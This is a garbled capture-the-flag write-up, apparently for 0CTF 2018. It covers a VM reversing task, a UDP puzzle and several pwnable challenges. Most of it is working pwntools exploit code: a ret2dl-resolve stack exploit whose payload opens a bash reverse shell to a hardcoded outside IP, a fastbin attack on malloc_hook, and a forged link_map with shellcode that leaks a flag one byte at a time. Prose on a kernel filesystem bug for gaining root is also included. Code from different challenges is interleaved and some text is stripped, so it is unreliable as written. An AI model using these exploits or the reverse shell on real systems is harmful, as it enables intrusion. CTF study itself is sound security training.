func0: max(a,b) func2:  func4:  func6: "123456" -> [1,2,3,4,5,6] func1(aa,bb):
cmp
main
http://ami.ektf.hu/uploads/papers/ﬁnalpdf/AMI_43_from29to41.pdf 10  
babyvm (solved)
The logic of the program is not that complex. The only thing we need to deal with is the statically
compiled stl . To get rid of this problem I ﬁred up my Visual Studio  and wrote a simple
program using deque  (since there're strings implying the usage of deque ) and tried to
understand the functions accordingly.
Finally I wrote a simple script to create a vm.bin  that outputs the ﬂag.
Script can be found here.
udp (Done)
4000udp 
 udp  master : port 5999 clusters : port 6000-10000 master 
cluster6000  ﬂag  master   54
60006001 a3baa->b+1 
 6001
t60 = ((t24+t26)*(t24+t28))*t24+((t24+t26)*(t26+t28))*t26+(t24+t28)*
(t26+t28))*t28
t66 = 10*(t24+t26)*(t24+t28)*(t26+t28)
t66 == t60
1
01
2
2
0
1
Pwnable
Baby Stack 2018
return to dl resolve
2
20
1
4000x40003999x3999
from pwn import *
from roputils import *
from hashlib import sha256
def get_solution(chal):
    for i in range(0, 0x100):
        for j in range(0, 0x100):
            for k in range(0, 0x100):
                for l in range(0, 0x100):
                    sol = chr(i) + chr(j) + chr(k) + chr(l)
                    if sha256(chal + sol).digest().startswith('\0\0\0'):
                        return sol
LOCAL = 0
VERBOSE = 1
DEBUG = 0
if VERBOSE:
    context.log_level = 'debug'
if LOCAL:
    io = process('./babystack')
    if DEBUG:
        gdb.attach(io, '')
else:
    io = remote('202.120.7.202', 6666)
    chal = io.recvuntil('\n')[:-1]
    io.send(get_solution(chal))
fpath = './babystack'
elf = ELF(fpath)
offset = 0x28+4
rop = ROP(fpath)
addr_bss = rop.section('.bss')
Baby heap 2018 (solved)
Libc = GNU C Library (Debian GLIBC 2.24-11+deb9u3) stable release version 2.24,
by Roland McGrath et al.  updatechunksize
overlapfastbin attack main arenatop chunk malloc
hookone gadget
buf1 = rop.retfill(offset)
buf1 += p32(0x08048300) + p32(0x804843B) + p32(0) + p32(addr_bss) + p32(100)
buf1 = buf1.ljust(0x40, 'A')
buf2 = rop.string("bash -c 'bash&>/dev/tcp/123.206.90.244/6666<&1';")
buf2 += rop.fill(50, buf2)
buf2 += rop.dl_resolve_data(addr_bss+50, 'system')
buf2 += rop.fill(100, buf2)
buf3 = rop.retfill(offset)
buf3 += rop.dl_resolve_call(addr_bss+50, addr_bss)
buf3 = buf3.ljust(0x40, 'A')
buf = buf1 + buf2 + buf3
buf = buf.ljust(0x100, 'A')
io.send(buf)
io.interactive()
#!/usr/bin/env python2
# coding:utf-8
from pwn import *
import os
import time
target = 'babyheap'
libc   = ['libc-2.24.so']     
break_points = []
remote_addr = '202.120.7.204'
remote_port = 127
p = remote(remote_addr,remote_port)
def allocate(size):
    p.sendlineafter("Command:","1")
    p.sendlineafter("Size:",str(size))
def update(index, new_size, data):
    p.sendlineafter("Command:","2")
    p.sendlineafter("Index:",str(index))
    p.sendlineafter("Size:",str(new_size))
    p.sendafter("Content:",data)
def delete(index):
    p.sendlineafter("Command:","3")
    p.sendlineafter("Index:",str(index))
def view(index):
    p.sendlineafter("Command:","4")
    p.sendlineafter("Index:",str(index))
def exp(cmd):
    allocate(0x18) #0
    allocate(0x48) #1
    allocate(0x48) #2
    allocate(0x20) #3
    update(0,0x19,"A"*0x18+"\xa1")
    delete(1)
    # hint()
    allocate(0x48) #1
    view(2)
    p.recvuntil("Chunk[2]: ")
    unsort_bin = u64(p.recv(8).ljust(8,'\0'))
    libc_base  = unsort_bin - 0x399b58
    main_arena = libc_base + 0x399b00
    malloc_hook = libc_base + 3775216
    magic = libc_base + 0x3f35a
    print hex(unsort_bin)
    print hex(libc_base)
    allocate(0x48) #4 in 2
    delete(1)
    delete(4)
    view(2)
    p.recvuntil("Chunk[2]: ")
    heap = u64(p.recv(8).ljust(8,'\0'))
    heap_base = heap-0x20
    print 'heap_base',hex(heap_base)
Zer0 FS (solved)
The kernel module is compiled with debugging symbols, we can easily extract and ﬁgure out the
entire structure of the ﬁlesystem.
The bugs lies in the handle of zerofs_inode , the ﬁlesystem does not perform any bound check
on file_size , so we can read/write out-of-bound.
So here comes how I exploited this bug. Since the address of the block buﬀer is not known by the
usermode, I tried to read the data stored after the buﬀer and I saw a lot of weird usermode
pointers & ﬁlesystem stuﬀ. I ﬁnally tried to create a readonly ﬁle mapping and write to the
mapping in kernel, there's a perfect target /umount  for the mapping since it's a suid  binary.
Doing so we can change the content of those suid  binary, then we can get root privilege through
    allocate(0x20)
    delete(1)
    update(2,0x8,p64(main_arena+0x15-8))
    print 'update ok'
    # time.sleep(2)
    allocate(0x48)
    # time.sleep(2)
    allocate(0x48)
    # time.sleep(2)
    update(4,0x3b+8,'\x00'*0x3b + p64(malloc_hook-35))
    # hint()
    print "ok"
    allocate(0x40)
    update(5,32+3,"\x00"*3 + p64(magic)*4)
    allocate(0x10)
    p.interactive()
if __name__ == '__main__':
    exp("id")
the manipulated suid  binary.
Full exploit can be found here.
Black Hole Theory
linkmap
from pwn import *
from hashlib import sha256
def get_solution(chal):
    for i in range(0, 0x100):
        for j in range(0, 0x100):
            for k in range(0, 0x100):
                for l in range(0, 0x100):
                    sol = chr(i) + chr(j) + chr(k) + chr(l)
                    if sha256(chal + sol).hexdigest().startswith('00000'):
                        return sol
LOCAL = 0
VERBOSE = 0
DEBUG = 0
context.arch = 'amd64'
if VERBOSE:
    context.log_level = 'debug'
def exploit(idx, num):
    if LOCAL:
        # io = process('./blackhole')
        io = process('./pow.py')
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        if DEBUG:
            gdb.attach(io, 'b *0x0000000000400A30\n')
    else:
        io = remote('202.120.7.203', 666)
        libc = ELF('./libc-2.24.so')
        chal = io.recvuntil('\n')[:-1]
        io.send(get_solution(chal))
    read_plt = 0x400730
    pop_rdi = 0x0000000000400a53
    pop_rsi_r15 = 0x0000000000400a51
    pop_csu_gadget = 0x0000000000400A4A
    mov_csu_gadget = 0x0000000000400A30
    bss = 0x601000
    elf = ELF('./blackhole')
    payload1 = 'A' * 0x28
    payload1 += p64(pop_rdi) + p64(0) + p64(pop_rsi_r15) + p64(bss+0x100) + 
p64(0) + p64(read_plt) + p64(0x4009A7)
    payload1 = payload1.ljust(0x100, 'A')
    # io.send(payload1)
    link_map_addr = bss + 0x100 + 8
    r_info = 0x0000000b00000007
    offset = (libc.symbols['mprotect'] - libc.symbols['__libc_start_main']) % 
2**64
    got_offset = (link_map_addr - 0x10 - offset) % 2**64
    start_main_index = 7
    link_map = ''
    link_map += p64(offset)                     # 0x00, l_addr
    link_map = link_map.ljust(0x28, '\x00')
    link_map += p64(elf.got['read'] - 0x108)   # symtab, 0x108 is offset
    link_map = link_map.ljust(0x68, '\x00')
    link_map += p64(link_map_addr + 0x28 - 8)  # 0x68, strtab_ptr - 8, any 
readable memory?
    link_map += p64(link_map_addr + 0x20)      # 0x70, symtab_ptr - 8
    link_map = link_map.ljust(0xf8, '\x00')
    payload2 = p64(0x4009C7) + link_map
    # io.send(payload2)
    payload3 = 'A' * 0x28
    payload3 += p64(pop_rdi) + p64(0) + p64(pop_rsi_r15) + p64(bss+0x200) + 
p64(0) + p64(read_plt)
    payload3 += p64(pop_csu_gadget) + p64(0) + p64(1) + p64(bss+0x100) + 
p64(7) + p64(0x1000) + p64(bss)
    payload3 += p64(mov_csu_gadget) + p64(0) * 7
    payload3 += p64(0x00000000004006C0 + 6)  # plt[0].inst[1]
    payload3 += p64(link_map_addr)
    payload3 += p64(start_main_index)
    payload3 += p64(bss+0x200+0x20)
    payload3 = payload3.ljust(0x100, 'A')
    # io.send(payload3)
    link_map = p64(link_map_addr + 0xf8)      # 0xf8, jmprel_ptr - 8
    link_map += p64(link_map_addr + 0x108 -
                start_main_index * 3 * 8)  # jmp_rel, +(index * 3 * 8) 
reloc_ptr
    link_map += p64(got_offset)     # reloc, 0x00, r_offset_base_address
    link_map += p64(r_info)         # reloc, 0x08, r_info
    payload4 = link_map
    shellcode = 'push 0x0; push 0x67616c66; mov rdi, rsp; mov rsi, 0; mov rax, 
2; syscall; mov rdi, rax; mov rsi, 0x601300; mov rdx, 0x100; mov rax, 0; 
syscall;'
0CTF is very nice.Thks 0ops:)
    shellcode += 'mov rsi, 0x601300; mov rcx, %d; mov al, [rsi+rcx]; cmp al, 
%d;' % (idx, num)
    shellcode2 = 'mov rbx, 0; div rbx;'
    shellcode_final = asm(shellcode) + '\x0f\x85\x02\x00\x00\x00\xeb\xfe' + 
asm(shellcode2)
    payload4 += shellcode_final
    payload4 = payload4.ljust(0x100, '\x90')
    # io.send(payload4)
    payload = payload1 + payload2 + payload3 + payload4
    payload = payload.ljust(0x800, '\x90')
    io.send(payload)
    try:
        cotent = io.recv(timeout=1)
        io.close()
        return True
    except EOFError:
        io.close()
        return False
if __name__ == '__main__':
    flag = ''
    for i in range(len(flag), 0x100):
        print '----------------', i
        for j in range(127, 32, -1):
            if exploit(i, j):
                flag += chr(j)
                print 'flag: ', flag
                file = open('remote_flag', 'w')
                file.write(flag)
                file.close()
                break